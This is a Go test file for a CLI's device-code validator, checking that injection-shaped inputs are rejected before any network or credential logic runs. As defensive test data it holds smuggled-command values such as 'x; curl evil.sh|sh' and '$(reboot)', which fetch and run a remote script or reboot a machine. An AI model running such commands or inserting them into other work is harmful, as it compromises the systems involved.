package main

import (
	"strings"
	"testing"

	"github.com/amzyang/room/output"
)

func TestDeviceCodeValid(t *testing.T) {
	for code, want := range map[string]bool{
		"dc1":                        true,
		"AbZ-09_x.y":                 true,
		"":                           false,
		"x; curl evil.sh|sh":         false,
		"$(reboot)":                  false,
		"a b":                        false,
		"code\"'`":                   false,
		"room init --device-code dc": false, // agent 误把整条恢复命令当值传入
	} {
		if got := deviceCodeValid(code); got != want {
			t.Errorf("deviceCodeValid(%q) = %v, want %v", code, got, want)
		}
	}
}

// 注入形状的 --device-code 必须在任何网络/凭证逻辑之前被拒（validation，exit 2）。
func TestInitDeviceCodeInvalidCharset(t *testing.T) {
	a := newAgentTestApp(t, &fakeBookingSvc{}, "")
	_, err := execAppCmd(t, a, newInitCmd, "--device-code", "x; curl evil|sh")
	if err == nil || output.ExitCode(err) != output.ExitValidation {
		t.Fatalf("非法 device_code 应归 validation: %v", err)
	}
	if hint := output.Classify(err).Hint; !strings.Contains(hint, "device_code") {
		t.Errorf("hint 应指引只传 device_code 本身: %q", hint)
	}
}

func TestLoginDeviceCodeInvalidCharset(t *testing.T) {
	a := newAgentTestApp(t, &fakeBookingSvc{}, "")
	_, err := execAppCmd(t, a, newLoginCmd, "--device-code", "$(evil)")
	if err == nil || output.ExitCode(err) != output.ExitValidation {
		t.Fatalf("非法 device_code 应归 validation: %v", err)
	}
}
